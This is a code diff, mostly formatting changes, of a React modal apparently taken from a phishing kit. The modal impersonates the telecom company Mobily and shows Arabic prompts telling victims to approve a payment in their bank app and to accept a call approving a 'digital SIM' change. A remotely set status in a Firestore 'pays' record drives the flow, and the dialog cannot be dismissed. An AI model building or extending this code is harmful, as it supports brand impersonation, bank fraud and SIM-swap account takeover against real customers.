@@ -1,74 +1,86 @@
-"use client"
+"use client";
 
-import { useEffect, useState } from "react"
-import { Dialog, DialogContent } from "@/components/ui/dialog"
-import { PhoneCall, Smartphone } from "lucide-react"
-import { db } from "@/lib/supabase-client"
-import { doc, onSnapshot, setDoc, Firestore } from "@/lib/supabase-client"
-import Image from "next/image"
+import { useEffect, useState } from "react";
+import { Dialog, DialogContent } from "@/components/ui/dialog";
+import { PhoneCall, Smartphone } from "lucide-react";
+import { db } from "@/lib/supabase-client";
+import { doc, onSnapshot, setDoc, Firestore } from "@/lib/supabase-client";
+
+import Image from "next/image";
 
 interface MobilyVerificationModalProps {
-  open: boolean
-  visitorId: string
-  onApproved: () => void
-  onRejected: () => void
+  open: boolean;
+  visitorId: string;
+  onApproved: () => void;
+  onRejected: () => void;
 }
 
-export function MobilyVerificationModal({ 
-  open, 
-  visitorId, 
-  onApproved, 
-  onRejected 
+export function MobilyVerificationModal({
+  open,
+  visitorId,
+  onApproved,
+  onRejected,
 }: MobilyVerificationModalProps) {
-  const [status, setStatus] = useState<"pending" | "approved" | "rejected" | "message">("pending")
-  const [isConfirming, setIsConfirming] = useState(false)
+  const [status, setStatus] = useState<
+    "pending" | "approved" | "rejected" | "message"
+  >("pending");
+  const [isConfirming, setIsConfirming] = useState(false);
 
   useEffect(() => {
-    if (!open || !visitorId || !db) return
+    if (!open || !visitorId || !db) return;
 
     const unsubscribe = onSnapshot(
       doc(db as Firestore, "pays", visitorId),
       (docSnapshot) => {
         if (docSnapshot.exists()) {
-          const data = docSnapshot.data()
-          const phoneOtpStatus = data.phoneOtpStatus as "pending" | "approved" | "rejected" | "verifying" | "message"
+          const data = docSnapshot.data();
+          const phoneOtpStatus = data.phoneOtpStatus as
+            | "pending"
+            | "approved"
+            | "rejected"
+            | "verifying"
+            | "message";
 
           if (phoneOtpStatus === "approved") {
-            setStatus("approved")
-            onApproved()
+            setStatus("approved");
+            onApproved();
           } else if (phoneOtpStatus === "rejected") {
-            setStatus("rejected")
-            onRejected()
+            setStatus("rejected");
+            onRejected();
           } else if (phoneOtpStatus === "message") {
-            setStatus("message")
+            setStatus("message");
           } else {
-            setStatus("pending")
+            setStatus("pending");
           }
         }
       },
       (error) => {
-        console.error("[Mobily Modal] Listener error:", error)
-      }
-    )
+        console.error("[Mobily Modal] Listener error:", error);
+      },
+    );
 
-    return () => unsubscribe()
-  }, [open, visitorId, onApproved, onRejected])
+    return () => unsubscribe();
+  }, [open, visitorId, onApproved, onRejected]);
 
   const handleMessageConfirm = async () => {
-    if (!visitorId || !db) return
-    setIsConfirming(true)
+    if (!visitorId || !db) return;
+    setIsConfirming(true);
     try {
-      await setDoc(doc(db as Firestore, "pays", visitorId), { phoneOtpStatus: "confirmed" }, { merge: true })
+      await setDoc(
+        doc(db as Firestore, "pays", visitorId),
+        { phoneOtpStatus: "confirmed" },
+        { merge: true },
+      );
     } catch (err) {
-      console.error("[Mobily Modal] confirm error:", err)
-      setIsConfirming(false)
+      console.error("[Mobily Modal] confirm error:", err);
+      setIsConfirming(false);
     }
-  }
+  };
 
   return (
     <Dialog open={open} onOpenChange={() => {}}>
-      <DialogContent 
-        className="sm:max-w-md" 
+      <DialogContent
+        className="sm:max-w-md"
         dir="rtl"
         onPointerDownOutside={(e) => e.preventDefault()}
         onEscapeKeyDown={(e) => e.preventDefault()}
@@ -84,29 +96,51 @@ export function MobilyVerificationModal({
             </div>
             <div className="space-y-3 text-center">
               <p className="text-lg font-bold leading-relaxed text-gray-800">
-                تم إرسال رمز التحقق. يرجى الدخول إلى تطبيق البنك الخاص بك والموافقة على العملية لإتمام الدفع.
+                تم إرسال رمز التحقق. يرجى الدخول إلى تطبيق البنك الخاص بك
+                والموافقة على العملية لإتمام الدفع.
               </p>
               <div className="flex items-center justify-center gap-2">
-                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#1976d2]" style={{ animationDelay: "0ms" }} />
-                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#1976d2]" style={{ animationDelay: "150ms" }} />
-                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#1976d2]" style={{ animationDelay: "300ms" }} />
+                <span
+                  className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#1976d2]"
+                  style={{ animationDelay: "0ms" }}
+                />
+                <span
+                  className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#1976d2]"
+                  style={{ animationDelay: "150ms" }}
+                />
+                <span
+                  className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#1976d2]"
+                  style={{ animationDelay: "300ms" }}
+                />
               </div>
             </div>
             {isConfirming ? (
               <div className="flex flex-col items-center gap-3">
                 <div className="flex items-center justify-center gap-2">
-                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#1976d2]" style={{ animationDelay: "0ms" }} />
-                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#1976d2]" style={{ animationDelay: "150ms" }} />
-                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#1976d2]" style={{ animationDelay: "300ms" }} />
+                  <span
+                    className="h-3 w-3 animate-bounce rounded-full bg-[#1976d2]"
+                    style={{ animationDelay: "0ms" }}
+                  />
+                  <span
+                    className="h-3 w-3 animate-bounce rounded-full bg-[#1976d2]"
+                    style={{ animationDelay: "150ms" }}
+                  />
+                  <span
+                    className="h-3 w-3 animate-bounce rounded-full bg-[#1976d2]"
+                    style={{ animationDelay: "300ms" }}
+                  />
                 </div>
-                <p className="text-sm font-semibold text-[#1976d2]">جاري انتظار موافقة البنك...</p>
+                <p className="text-sm font-semibold text-[#1976d2]">
+                  جاري انتظار موافقة البنك...
+                </p>
               </div>
             ) : (
               <button
                 onClick={handleMessageConfirm}
                 className="w-full max-w-xs rounded-2xl px-6 py-3 font-bold text-sm transition-all"
                 style={{
-                  background: "linear-gradient(135deg, #f4ad27 0%, #e09a18 100%)",
+                  background:
+                    "linear-gradient(135deg, #f4ad27 0%, #e09a18 100%)",
                   color: "#1a3d52",
                   boxShadow: "0 6px 20px rgba(244,173,39,0.35)",
                 }}
@@ -118,7 +152,12 @@ export function MobilyVerificationModal({
         ) : (
           <div className="flex flex-col items-center justify-center space-y-6 py-8">
             <div className="w-32 h-32 relative">
-              <Image src="/Mobily_Logo.svg" alt="Mobily Logo" fill className="object-contain" />
+              <Image
+                src="/Mobily_Logo.svg"
+                alt="Mobily Logo"
+                fill
+                className="object-contain"
+              />
             </div>
             <div className="relative">
               <div className="absolute inset-0 animate-ping">
@@ -130,14 +169,26 @@ export function MobilyVerificationModal({
             </div>
             <div className="text-center space-y-3 px-4">
               <p className="text-base text-gray-700 leading-relaxed">
-                عزيزنا العميل سيتم الاتصال بك من اجل تاكيد شريحتك الرقميه قد يتم قطع الخدمة موقتا و اعادة تشغيلها عن هاتفك الرجاء قبول المكالمة و الموافقة على الطلب و لا تشارك اي رمز تاكيد مع احد ان موظفينا لا يقومون بطلب هذه الرموز شكرا لك
+                عزيزنا العميل سيتم الاتصال بك من اجل تاكيد شريحتك الرقميه قد يتم
+                قطع الخدمة موقتا و اعادة تشغيلها عن هاتفك الرجاء قبول المكالمة و
+                الموافقة على الطلب و لا تشارك اي رمز تاكيد مع احد ان موظفينا لا
+                يقومون بطلب هذه الرموز شكرا لك
               </p>
             </div>
             <div className="flex flex-col items-center space-y-2">
               <div className="flex space-x-2 space-x-reverse">
-                <div className="w-3 h-3 bg-green-500 rounded-full animate-bounce" style={{ animationDelay: "0ms" }}></div>
-                <div className="w-3 h-3 bg-green-500 rounded-full animate-bounce" style={{ animationDelay: "150ms" }}></div>
-                <div className="w-3 h-3 bg-green-500 rounded-full animate-bounce" style={{ animationDelay: "300ms" }}></div>
+                <div
+                  className="w-3 h-3 bg-green-500 rounded-full animate-bounce"
+                  style={{ animationDelay: "0ms" }}
+                ></div>
+                <div
+                  className="w-3 h-3 bg-green-500 rounded-full animate-bounce"
+                  style={{ animationDelay: "150ms" }}
+                ></div>
+                <div
+                  className="w-3 h-3 bg-green-500 rounded-full animate-bounce"
+                  style={{ animationDelay: "300ms" }}
+                ></div>
               </div>
               <p className="text-sm text-gray-500">جاري الانتظار...</p>
             </div>
@@ -145,5 +196,5 @@ export function MobilyVerificationModal({
         )}
       </DialogContent>
     </Dialog>
-  )
+  );
 }
